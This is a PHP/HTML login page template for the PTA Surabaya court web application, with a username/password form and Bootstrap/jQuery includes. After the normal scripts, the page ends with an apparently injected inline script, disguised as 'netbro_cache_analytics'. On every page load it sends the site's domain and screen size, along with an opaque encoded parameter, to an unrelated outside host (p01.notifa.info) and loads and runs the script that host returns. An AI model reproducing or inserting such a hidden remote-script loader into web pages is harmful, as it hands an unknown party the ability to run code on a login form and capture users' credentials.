
<!DOCTYPE html>
<!--[if IE 8]><html class="ie8 no-js" lang="en"><![endif]-->
<!--[if IE 9]><html class="ie9 no-js" lang="en"><![endif]-->
<!--[if !IE]><!-->
<html class="no-js">
<!--<![endif]-->

<head>
    <title>Login PTA Surabaya</title>
    <!-- <link rel="shortcut icon" href="favicon.ico" /> -->
    <link rel="icon" href="<?php echo base_url('static/assets/images/icons/icon_pa.ico');?>" type="image/gif">
    <!-- start: META -->
    <meta charset="utf-8" />
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content="IE=edge,IE=9,IE=8,chrome=1" /><![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta content="Responsive Admin Template build with Twitter Bootstrap and jQuery" name="description" />
    <meta content="ClipTheme" name="author" />
    <!-- end: META -->
    <!-- start: MAIN CSS -->
    <link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600,700|Raleway:400,100,200,300,500,600,700,800,900/" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/bower_components/bootstrap/css/bootstrap.min.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/bower_components/font-awesome/css/font-awesome.min.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/assets/fonts/clip-font.min.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/bower_components/iCheck/skins/all.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/bower_components/sweetalert/dist/sweetalert.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/assets/css/main.min.css" />
    <link type="text/css" rel="stylesheet" href="<?php echo base_url()?>static/assets/css/main-responsive.min.css" />
    <link type="text/css" rel="stylesheet" media="print" href="<?php echo base_url()?>static/assets/css/print.min.css" />
    <link type="text/css" rel="stylesheet" id="skin_color" href="<?php echo base_url()?>static/assets/css/theme/light.min.css" />
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/jquery/dist/jquery.min.js"></script>

    <!-- end: MAIN CSS -->
    <!-- start: CSS REQUIRED FOR THIS PAGE ONLY -->
    <link href="<?php echo base_url()?>static/bower_components/fullcalendar/dist/fullcalendar.min.css" rel="stylesheet" />
    <!-- end: CSS REQUIRED FOR THIS PAGE ONLY -->
</head>

<body class="login example2">

    <div class="main-login col-sm-4 col-sm-offset-4">
        <div class="logo">
            <!-- CLIP<i class="clip-clip"></i>ONE -->
            PENGADILAN TINGGI AGAMA SURABAYA
        </div>
        <!-- start: LOGIN BOX -->
        <div class="box-login">
            <h3>Sign in to your account</h3>
            <p>
                Please enter your name and password to log in.
            </p>
            <form class="form-login" action="<?php echo base_url().'login/auth'?>" method="post">
                <div class="errorHandler alert alert-danger no-display">
                    <i class="fa fa-remove-sign"></i> You have some form errors. Please check below.
                </div>
                <fieldset>
                    <div class="form-group">
                        <span class="input-icon">
                            <input type="text" class="form-control" id="username" name="username" placeholder="Username">
                            <i class="fa fa-user"></i>
                        </span>
                    </div>
                    <div class="form-group form-actions">
                        <span class="input-icon">
                            <input type="password" id="password" class="form-control password" name="password" placeholder="Password">
                            <i class="fa fa-lock"></i>
                            <a class="forgot" href="#">
                                I forgot my password
                            </a>
                        </span>
                    </div>
                    <div class="form-actions">
                        <label for="remember" class="checkbox-inline">
                            <input type="checkbox" class="grey remember" id="remember" name="remember">
                            Keep me signed in
                        </label>
                        <button type="submit" class="btn btn-info pull-right">
                            Login <i class="fa fa-arrow-circle-right"></i>
                        </button>
                    </div>
                    <div class="new-account">
                        Don't have an account yet?
                        <a href="#" class="register">
                            Create an account
                        </a>
                    </div>
                </fieldset>
            </form>
        </div>
        <!-- end: LOGIN BOX -->
        <!-- start: COPYRIGHT -->
        <div class="copyright">
            <script>
                document.write(new Date().getFullYear())
            </script> &copy; PTA Surabaya.
        </div>
        <!-- end: COPYRIGHT -->
    </div>

    <!-- start: MAIN JAVASCRIPTS -->
    <!--[if lt IE 9]>
            <script src="../../bower_components/respond/dest/respond.min.js"></script>
            <script src="../../bower_components/Flot/excanvas.min.js"></script>
            <script src="../../bower_components/jquery-1.x/dist/jquery.min.js"></script>
            <![endif]-->
    <!--[if gte IE 9]><!-->
    <!-- <script type="text/javascript" src="../../bower_components/jquery/dist/jquery.min.js"></script> -->
    <!--<![endif]-->
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/jquery-ui/jquery-ui.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/blockUI/jquery.blockUI.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/iCheck/icheck.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/perfect-scrollbar/js/min/perfect-scrollbar.jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/jquery.cookie/jquery.cookie.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/bower_components/sweetalert/dist/sweetalert.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url()?>static/assets/js/min/main.min.js"></script>
    <!-- <script type="text/javascript" src="../../bower_components/jquery-ui/jquery-ui.min.js"></script>
    <script type="text/javascript" src="../../bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="../../bower_components/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js"></script>
    <script type="text/javascript" src="../../bower_components/blockUI/jquery.blockUI.js"></script>
    <script type="text/javascript" src="../../bower_components/iCheck/icheck.min.js"></script>
    <script type="text/javascript" src="../../bower_components/perfect-scrollbar/js/min/perfect-scrollbar.jquery.min.js"></script>
    <script type="text/javascript" src="../../bower_components/jquery.cookie/jquery.cookie.js"></script>
    <script type="text/javascript" src="../../bower_components/sweetalert/dist/sweetalert.min.js"></script>
    <script type="text/javascript" src="assets/js/min/main.min.js"></script> -->
    <!-- end: MAIN JAVASCRIPTS -->
    <!-- start: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->
    <script type="text/javascript" src="<?php echo base_url()?>static/assets/js/jquery.validate.min.js"></script>
    <!-- <script src="../../bower_components/jquery-validation/dist/jquery.validate.min.js"></script> -->
    <script type="text/javascript" src="<?php echo base_url()?>static/assets/js/min/login.min.js"></script>
    <!-- <script src="assets/js/min/login.min.js"></script> -->
    <!-- end: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->

    <script>
        jQuery(document).ready(function() {
            Main.init();
            Login.init();
        });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2g3BVRwK38UqRkKuZwAXTBJsLHY2TLzqS9JKKzhgun%2f3BmaPNZ3%2bA3ImW1gKqlveuyBNDwh5cNtzNVjDVPjr0KBXzN0lipLQXa%2f%2bnm6TTo9V4EtS5lxzB%2fO3ydTDIi5L8NJBktj3lro%2fghBBo8x%2blNBwafSxFQ7%2bJWUfmN7uKW4aH1PSu7Py6URdhOdgNhywoGeEFaIelZqMEyvhQuRcFMsdLPajm0sSq%2bbAMbtkgIFQ8ldCnLChvTOczQfW05Ua%2b3KVh39bDSJkwVoAcuoYhOx2%2bjOjgZ7cM6Gh%2fTNEiJOvSkTtdqYHBHwoIOfEfJDEllo1PneikspVIxOF4PVzFWm9XnNub3C6ouTRWTEmQcz1XYRe1dt%2fYg4oLTgBJa0jAWNNqaytLqoq253NMgyiUbcMXpTbS7xI02CPojLKzj9YkhT4x3488BL%2fFwXsEkV6RnPybHqiNyScMiY7392PO%2bTjHedDEK88z4XlbvtgXauAF8Z2djMynzMEbS3TzuqJg9wzyAjphtY0eXfuXfX0%2bcWZTXwIPZLn0NRuxsUQNh7rLqSfLVR2hq6KeIMaoTeK3CDyAp1%2f4mlNDeFzq%2b%2f38Fq%2bcnZBhsL7EUJo6ME%2bcNYkUnJauD6Z4%2fo4naq700uNY6I7ErT77Ppr9yjtlgWA16Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>